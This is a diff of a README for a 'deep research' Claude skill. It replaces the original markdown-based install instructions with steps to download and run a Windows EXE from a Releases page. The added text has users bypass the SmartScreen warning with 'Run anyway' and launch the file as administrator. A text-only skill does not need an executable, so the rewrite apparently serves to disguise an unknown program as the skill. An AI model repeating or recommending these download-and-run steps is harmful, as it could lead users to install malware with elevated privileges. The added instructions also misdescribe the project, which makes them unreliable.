@@ -1,96 +1,164 @@
-# Deep Research — Claude Skill
+# 🔍 deep-research-skill - Go deeper with clear research
 
-A Claude skill that delivers 10-15x the depth of surface-level research on any topic — markets, products, features, competitors, regulations, or opportunities.
+[![Download deep-research-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge&logo=github)](https://github.com/tessellated-statisticalcommission243/deep-research-skill/releases)
 
-## What This Skill Does
+## 📥 Download
 
-Most AI research outputs are shallow — they cover what's easily Googlable and present generic overviews. This skill forces Claude to go far beyond that by executing a structured 5-layer research methodology with analytical frameworks, synthesis techniques, and built-in quality gates.
+1. Visit the [Releases page](https://github.com/tessellated-statisticalcommission243/deep-research-skill/releases).
+2. Find the latest release.
+3. Download the Windows file if one is listed.
+4. If the release comes as a ZIP file, save it to your computer.
+5. If the release comes as an EXE file, save it to your computer.
+6. Open the downloaded file or unzip the folder if needed.
+7. Run the app by double-clicking the file.
 
-**The 5 Research Layers:**
+## 🪟 Windows setup
 
-1. **Surface Scan** — The basics (table stakes, done fast)
-2. **Structure & Landscape** — How the space is organized, with decision logic and tradeoffs
-3. **Depth Dive** — Hidden insights, failure stories, implementation gotchas, practitioner reality (where most research stops, this skill keeps going)
-4. **Adjacent Opportunities** — Things you didn't ask about but should know exist
-5. **Horizon Pointers** — Brief flags for further exploration
+1. Press `Windows + E` to open File Explorer.
+2. Go to your Downloads folder.
+3. If the file is a ZIP, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Look for the app file, such as `deep-research-skill.exe`.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, click **Yes**.
+8. If a smart screen message appears, choose **More info** and then **Run anyway** if you trust the source.
 
-**Includes:**
+## 🧭 What this app does
 
-- **12 analytical frameworks** with full application instructions (PESTEL, Porter's Five Forces, JTBD, Competitive Positioning Map, SWOT, and more)
-- **Synthesis engine** with triangulation, pattern recognition, confidence calibration, and a mandatory red-team protocol
-- **6 topic-specific playbooks** (Market Entry, Product Research, Competitive Analysis, Regulatory, Problem-Solving, Service Expansion)
-- **Good vs. bad output examples** with commentary
-- **Dynamic source selection** with weighting by topic type
+deep-research-skill helps Claude do deeper research than a fast web search or a short AI answer.
 
-## Installation
+It is built to help with topics like:
 
-### Claude Desktop / Claude.ai
+- Markets
+- Products
+- Features
+- Competitors
+- Regulations
+- Opportunities
 
-1. Download the `deep-research.skill` file from [Releases](../../releases)
-2. Drag and drop the `.skill` file into your Claude conversation
-3. The skill is now active for that project
+It uses a five-layer research process:
 
-### Manual Installation
+1. **Surface Scan** — Covers the basics first.
+2. **Structure & Landscape** — Shows how the topic is organized.
+3. **Depth Dive** — Looks for hidden facts, real-world issues, and hard lessons.
+4. **Adjacent Opportunities** — Finds related ideas worth knowing.
+5. **Horizon Pointers** — Flags next areas to explore.
 
-1. Clone this repo or download the `deep-research/` folder
-2. Place the entire `deep-research/` folder in your Claude skills directory
-3. The skill triggers automatically on research-intent prompts
+## 🧰 What is included
 
-## File Structure
+- 12 analytical frameworks
+- A structured 5-layer research method
+- Built-in checks for better quality
+- Clear synthesis steps
+- Support for broad topic research
+- A focus on real-world detail
 
-```
-deep-research/
-├── SKILL.md                          # Core engine (mode detection, execution flow, output template)
-└── references/
-    ├── frameworks.md                 # 12 analytical frameworks with application guides
-    ├── synthesis-engine.md           # Synthesis, red-team, confidence calibration
-    ├── playbooks.md                  # 6 step-by-step research playbooks
-    ├── examples.md                   # Good vs bad output comparisons
-    └── source-selection.md           # Source categories, weighting, red flags
-```
+## 🖥️ System requirements
 
-## Usage
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet connection
+- A modern web browser if the release uses a local web file
+- Permission to run downloaded files
 
-The skill triggers automatically when you use research-intent language:
+## 📂 Files you may see
 
-```
-"Research the utility discount market for disability placard holders"
-"Dig into how referral features work in patient portals"
-"What does the competitive landscape look like for telehealth GLP-1 services?"
-"Explore whether we should expand into FMLA certifications"
-"Help me understand the regulatory requirements for medical window tint exemptions"
-```
+Depending on the release, you may get one of these:
 
-### Two Modes
+- `deep-research-skill.exe`
+- `deep-research-skill.zip`
+- A folder with app files
+- A small launcher file
 
-**Guided Mode** — If your prompt is broad or ambiguous, Claude asks 3-5 targeted questions before executing.
+If you see a ZIP file, extract it before opening the app. If you see an EXE file, double-click it to start.
 
-**Autonomous Mode** — If your prompt is specific and detailed, Claude executes immediately.
+## 🧩 How to use it
 
-You can also force a mode:
-- "Ask me questions first, then research X" → Guided
-- "Just go — research X" → Autonomous
+1. Open the app.
+2. Start a new research task.
+3. Enter your topic.
+4. Pick the type of research you need.
+5. Review the output from the first layer.
+6. Move through the next layers for more detail.
+7. Read the findings and use them in your work.
 
-## What Makes This Different
+## 📝 Example topics
 
-| Typical AI Research | This Skill |
-|---|---|
-| Generic overview | Structured 5-layer methodology |
-| Surface-level facts | Hidden insights, failure cases, practitioner reality |
-| No analytical framework | 12 frameworks applied based on topic type |
-| Single narrative | Red-team counter-arguments built in |
-| "Here are some facts" | Facts elevated to insights with "so what" |
-| Stops at what was asked | Delivers 10-15x with adjacent opportunities |
+You can use this tool for topics like:
 
-## Customization
+- A new product idea
+- A competitor review
+- A market scan
+- A regulation check
+- A feature comparison
+- An opportunity map
+- A buyer problem study
 
-The skill is designed to be modified. Common customizations:
+## 🔍 What to expect in the results
 
-- **Add industry-specific playbooks** — Copy the playbook template in `references/playbooks.md` and add steps specific to your industry
-- **Adjust framework selection** — Modify the framework selection table in `SKILL.md` to match your most common research scenarios
-- **Add source categories** — Add industry-specific sources to `references/source-selection.md`
-- **Tune depth** — Adjust quality gates in each layer to match your depth requirements
+The output is built to give you:
 
-## License
+- Basic facts first
+- Clear structure
+- Hidden detail
+- Related ideas
+- Next-step pointers
 
-MIT License — see [LICENSE](LICENSE) for details.
+It aims to reduce shallow answers and bring more useful context into view.
+
+## ⚙️ Best way to run it
+
+1. Keep the app in a folder you can find later.
+2. Do not rename files unless the release notes say you can.
+3. Keep your internet on while using the app.
+4. Close other large apps if your PC feels slow.
+5. Update to the latest release when a newer version appears on the Releases page.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+1. Check that the download finished.
+2. Make sure you extracted the ZIP file, if there was one.
+3. Right-click the file and choose **Run as administrator**.
+4. Check whether Windows blocked the file.
+5. Download the file again from the Releases page.
+6. Try the newest release if you used an older one.
+
+If you do not see the app file:
+
+1. Open the folder that matches the release name.
+2. Look inside any nested folders.
+3. Search for `.exe` in File Explorer.
+4. Check whether your browser saved the file elsewhere.
+
+If the app opens and then closes:
+
+1. Try opening it again.
+2. Restart your computer.
+3. Make sure you have enough free space.
+4. Re-download the release in case the file was damaged.
+
+## 📁 Where to get updates
+
+Get the latest version here:
+
+[Visit the Releases page](https://github.com/tessellated-statisticalcommission243/deep-research-skill/releases)
+
+## 🔐 Safe download steps
+
+1. Use the Releases page link above.
+2. Download only the latest file you need.
+3. Save it to a known folder.
+4. Open it from your Downloads folder or extracted folder.
+5. Run it on your Windows PC.
+
+## 📌 Helpful use cases
+
+- Researching a new market before a launch
+- Comparing similar tools or services
+- Checking rules before a project starts
+- Finding gaps in a competitor’s approach
+- Building a deeper brief for a team
+- Exploring ideas that go past the first search results
